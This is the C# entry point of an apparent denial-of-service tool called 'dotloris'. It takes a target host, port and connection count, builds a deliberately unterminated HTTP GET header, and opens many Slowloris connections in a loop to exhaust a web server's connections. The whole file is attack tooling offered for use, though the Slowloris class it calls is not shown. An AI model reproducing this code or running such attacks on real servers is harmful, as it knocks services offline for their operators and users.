using System;
using McMaster.Extensions.CommandLineUtils;
using System.Net;
using System.Net.Sockets;

namespace dotloris
{
    [HelpOption]
    class Program
    {
        [Option(Description="The host to attack.")]
        public string Host { get; }

        [Option(Description="The host's port to attack.")]
        public int Port { get; }

        [Option(Description="Number of connections to the host.")]
        public int Connections { get; }

        public static void Main(string[] args)
            => CommandLineApplication.Execute<Program>(args);
        
        private void OnExecute(){

            Console.WriteLine($"[Info] Attacking {Host}:{Port}");

            string requestHeader = $"GET / HTTP/1.1\r\nHost: {Host}\r\n";

            Console.WriteLine($"[info] GET request will be :\n======\n{requestHeader}======");


            for(var i = 0; i < Connections; i++){
                var slowloris = new Slowloris();
                slowloris.Attack(IPAddress.Parse(Host), Port, requestHeader);
            }

            while(true) { };
        }
        
    }
}
